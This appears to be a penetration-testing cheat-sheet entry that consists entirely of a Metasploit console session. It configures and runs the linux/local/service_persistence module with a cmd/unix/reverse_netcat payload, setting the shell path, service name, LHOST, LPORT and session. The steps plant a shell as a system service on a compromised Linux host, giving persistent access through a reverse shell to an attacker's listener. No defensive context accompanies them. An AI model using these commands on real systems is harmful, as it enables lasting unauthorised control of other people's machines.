# Metasploit

```
msf > use exploit/linux/local/service_persistence

msf exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION                      yes       The session to run this module on
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf exploit(linux/local/service_persistence) > set shellpath </usr/local/bin | /usr/bin>

msf exploit(linux/local/service_persistence) > set service <service_name>

msf exploit(linux/local/service_persistence) > set shell_name <program_name>

msf exploit(linux/local/service_persistence) > set lhost <IP>

msf exploit(linux/local/service_persistence) > set lport <PORT>

msf exploit(linux/local/service_persistence) > set session <session_id>

msf exploit(linux/local/service_persistence) > run
```